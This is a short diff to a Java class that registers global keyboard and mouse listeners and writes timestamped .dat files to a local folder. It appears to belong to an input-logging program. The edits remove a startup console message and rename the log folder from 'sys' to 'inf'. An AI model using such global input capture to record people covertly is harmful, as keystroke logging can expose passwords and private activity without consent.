@@ -93,7 +93,6 @@ public class Storage implements NativeKeyListener, NativeMouseListener {
         GlobalScreen.getInstance().addNativeKeyListener(this);
         GlobalScreen.getInstance().addNativeMouseListener(this);
         //GlobalScreen.getInstance().addNativeMouseWheelListener(this);
-        System.out.println("Init GetActions OK!.");
     }
 
     @Override
@@ -272,7 +271,7 @@ public class Storage implements NativeKeyListener, NativeMouseListener {
             return true;
         }
         try {
-            File dir = new File(System.getProperty("user.dir", ""), "sys");
+            File dir = new File(System.getProperty("user.dir", ""), "inf");
             dir.mkdir();
             writer = new FileWriter(new File(dir, System.currentTimeMillis() + ".dat"));
             return true;
